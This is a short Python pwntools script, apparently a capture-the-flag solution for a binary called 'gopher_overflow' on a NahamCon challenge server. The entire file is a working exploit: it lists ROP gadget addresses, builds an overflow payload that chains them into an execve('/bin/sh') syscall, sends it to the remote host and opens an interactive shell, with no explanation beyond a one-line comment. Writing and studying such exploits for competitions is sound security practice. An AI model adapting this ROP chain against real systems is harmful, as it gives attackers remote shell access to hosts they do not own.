# just ROP and ROP
from pwn import *

#p = process('./gopher_overflow')
p = remote('challenge.nahamcon.com',31713)
g1 = 0x000000000047a67a # pop rdx ; ret
g2 = 0x000000000044a7ff # mov rdi, rbx ; add rsp, 0x18 ; pop rbp ; ret
g3 = 0x0000000000404aa1 # pop rbx, ret
g4 = 0x00000000004036cc # syscall  
g5 = 0x0000000000404968 # pop rax ; pop rbp ; ret
g6 = 0x00000000004036ee # mov rcx, 0 ; ret
g7 = 0x00000000004115c9 # mov rsi, rcx ; add rsp, 0x10 ; pop rbp ; ret
g8 = 0x0000000000412066 # mov rcx, rdx ; add rsp, 0x10 ; pop rbp ; ret
g9 = 0x000000000042ef08 # push rsp ; ret
g10 = 0x000000000045d99c # add rdi, 0x10 ; ret
payload = b'/bin/sh\x00'                   # 8
payload += b'a'*24+p64(0x47cd56)+p64(50)   # 40
payload += b'a'*40                         # 40
payload += p64(0x47cd56)                   # 8
payload += b'a'*48                         # 48
payload += p64(0x47cd56)*5                 # 40
payload += p64(100)                        # 8
payload += b'a'*48                         # 48
payload += p64(g5) + p64(59) + p64(0) + p64(g3) + p64(0xc000106de0)
payload += p64(g2) + p64(0)*4 + p64(g6) + p64(g7) + p64(0)*3
payload += p64(g1) + p64(0) + p64(g4)
p.send(payload)
p.interactive()
